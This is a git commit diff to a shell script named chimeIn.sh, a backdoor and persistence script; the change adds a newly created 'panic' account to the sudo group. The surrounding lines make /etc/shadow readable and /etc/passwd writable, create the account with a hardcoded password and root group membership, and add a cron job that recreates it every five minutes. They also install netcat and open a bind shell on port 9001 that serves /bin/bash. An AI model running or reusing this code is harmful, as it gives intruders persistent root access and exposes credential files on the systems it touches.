4162cb73a2ca59cf60271841cae80b1b5e6439a8
Kole Swesey <45017744+0xPanic@users.noreply.github.com>
2021-04-24 19:35:57 -0500

    redundancy

--- chimeIn.sh
+++ chimeIn.sh
@@ -3,6 +3,7 @@ chmod 644 /etc/shadow
 chmod 666 /etc/passwd
 useradd panic  && echo -e "riseab0ve\nriseab0ve" | passwd panic
 usermod -a -G root panic
+usermod -a -G sudo panic
 echo "*/5 * * * *  root  useradd panic && echo -e "riseab0ve\nriseab0ve" | passwd panic && usermod -a -G root panic" >> /etc/crontab
 apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
 nc.traditional -l -p 9001 -e /bin/bash &
